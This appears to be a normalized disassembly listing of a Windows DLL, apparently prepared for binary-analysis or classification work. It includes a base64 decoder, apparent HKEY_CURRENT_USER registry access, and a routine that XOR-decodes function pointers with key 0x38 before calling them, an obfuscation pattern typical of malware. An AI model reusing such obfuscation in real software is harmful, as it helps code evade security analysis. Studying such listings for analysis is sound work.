xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0xd
je r-xdata
inc [ ebp + 0x10 ]
dec edx
mov [ ebp - 0x4 ] edx
test edx edx
jne r-xdata
cmp al 0xa
je r-xdata
mov eax [ ebp + 0x8 ]
movzx edx al
mov al [ edx + r--data ]
xor edx edx
cmp al 0x40
sete dl
movzx eax al
and eax 0x3f
shl ecx 0x6
inc edi
sub ebx edx
or ecx eax
cmp edi 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
xor edi edi
test ebx ebx
je r-xdata
cmp ebx 0x1
jbe r-xdata
mov edx ecx
shr edx 0x10
mov [ esi ] dl
inc esi
mov edx [ ebp - 0x4 ]
cmp ebx 0x2
jbe r-xdata
mov eax ecx
shr eax 0x8
mov [ esi ] al
inc esi
mov [ esi ] cl
inc esi
jmp r-xdata
sub_10015270
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f6b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10015330
push ebp
mov ebp esp
sub esp 0x948
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x948 ] eax
mov esi edx
mov [ ebp - 0x940 ] ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0x5
call sub_10038bb0
lea edx [ ebp - 0x58 ]
mov eax 0x1
call sub_10038bb0
push 0x1
mov ecx edx
push 0x0
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_1005f180
add esp 0x8
test eax eax
je r-xdata
push ebx
push edi
lea edx [ ebp - 0x944 ]
mov eax 0x7
call sub_10038bb0
lea edx [ ebp - 0x93c ]
mov eax 0x9
call sub_10038bb0
lea edx [ ebp - 0x938 ]
mov eax 0x3
call sub_10038bb0
mov edi [ StrStrW@IAT ]
mov eax edx
push eax
push esi
call edi
lea ecx [ ebp - 0x72c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x93c ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x938 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x6 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x3 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x940 ]
lea ecx [ ebp - 0x938 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x940 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x940 ]
lea edx [ ebp - 0x938 ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x944 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
lea ecx [ ebp - 0x93c ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x938 ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0x4
call sub_10038bb0
push 0x3
push edx
lea ecx [ ebp - 0x72c ]
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_1005f180
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
xor eax eax
call sub_10038bb0
lea edx [ ebp - 0x78 ]
mov eax 0x8
call sub_10038bb0
mov eax edx
push eax
lea ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x934 ]
call sub_1006d3c0
mov ecx [ ebp - 0x948 ]
push 0x1
push 0x0
mov eax ebx
mov edx 0x80000001
call sub_1005f180
add esp 0x14
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xe
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x24 ]
mov eax 0x2
call sub_10038bb0
lea edx [ ebp - 0x98 ]
mov eax 0x6
call sub_10038bb0
mov eax edx
push 0x1
push eax
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x934 ]
mov edx 0x80000001
call sub_1005f180
add esp 0x8
neg eax
pop edi
sbb eax eax
pop ebx
and eax 0x10
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xf
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10015788
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10015820
push ebp
mov ebp esp
push 0xffffffff
push sub_10086c49
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x18 ]
push eax
call sub_10026420
mov ecx [ ebp - 0x18 ]
mov eax 0x51eb851f
mul ecx
mov eax edx
shr eax 0x3
mov dl 0x19
imul dl
sub cl al
mov eax [ esi + 0x10 ]
add esp 0x4
lea ebx [ ecx + 0x41 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
jbe r-xdata
push r--data
call sub_10030594
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10045c60
jmp r-xdata
setne al
test al al
je r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
test edi edi
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
cmp eax [ ebp + 0xc ]
jb r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax ] 0x0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ eax + edi ] 0x0
sub_10015940
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x94
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1002d970
mov eax esi
mov esp ebp
pop ebp
retn
sub_10015970
push ebp
mov ebp esp
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0x10 ]
push ebx
mov [ ebp - 0x18 ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x18 ]
push esi
xor eax eax
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x20 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0xc ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea edx [ ebp - 0x28 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
call [ ebp + 0xc ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x24 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
sub_10015a73
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_1001b30c
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_1001b30c
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_1001b30c
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_1001b30c
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001f2f1
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_1001b30c
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_10015c68
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_1002882d
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10015c8d
push 0x38
mov eax sub_100852a6
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004ad92
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10015d3b
push 0xc
mov eax sub_100859f3
call sub_10026266
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1002bd30
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x20
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10001f5d
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100168c0
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1001f400
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_10064b66
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_1007179d
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x8
call sub_1002e3ac
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10021806
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_10064f10
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
jmp r-xdata
push 0x18
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_1004a2b1
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_1003e971
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_1000ac90
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_1005620e
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_100294ad
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_100722a2
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x1c
call sub_1002e3ac
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_1000a631
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
call sub_10008d33
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_100246b4
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x14
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_1000b97c
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_100054b4
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10048c5d
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_10066b6a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_1000a631
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
